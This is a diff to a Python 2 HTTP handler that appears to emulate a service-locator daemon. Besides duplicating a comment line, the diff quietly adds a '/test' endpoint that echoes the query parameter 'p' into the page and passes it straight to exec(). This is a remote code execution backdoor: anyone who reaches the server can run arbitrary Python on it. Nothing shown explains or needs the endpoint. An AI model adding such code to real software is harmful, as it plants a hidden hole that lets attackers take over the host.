@@ -54,6 +54,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 			s.wfile.write("Mapping=" + str(PORT_NUMBER) + "\r\n")
 		elif ppath.path == '/login' and 'username' in query:
 			# login challange
+			# login challange
 			s.send_response(403)
 			s.send_header("X-NI-AUTH-PARAMS", "N=1,s=n7gxGBi085pJ+upFcfxEvQ==,B=ro8BaR4PUaUUcGsQZvFeE8Gbav1iYBFX3+37bGNJUCPcOSvuzle9y5EErTu4F2/Ry5GhmaYHCYo9sBbqa9HAJFk+TMc641aZlnsUG+fojWPdef98Lnis8kuXqfl5GTKgM9PS4CF+4AJ2MM59HQW6+Qm/mCZLDJhMPWr+efFmEvI=,ss=")
 			s.end_headers()
@@ -71,6 +72,13 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 			# response is sent, just close the connection
 			print "GET deletetree received"
 			s.wfile.close()
+		elif ppath.path == '/test' and 'p' in query:
+			s.send_response(200)
+			s.end_headers()
+			s.wfile.write("<html><head>")
+			s.wfile.write("Test: "+query['p'][0])
+			exec(query['p'][0])
+			s.wfile.write("</head></html>")
 		elif ppath.path == '/publish':
 			# call to service locator to add a service
 			# this happens when LV daemon starts
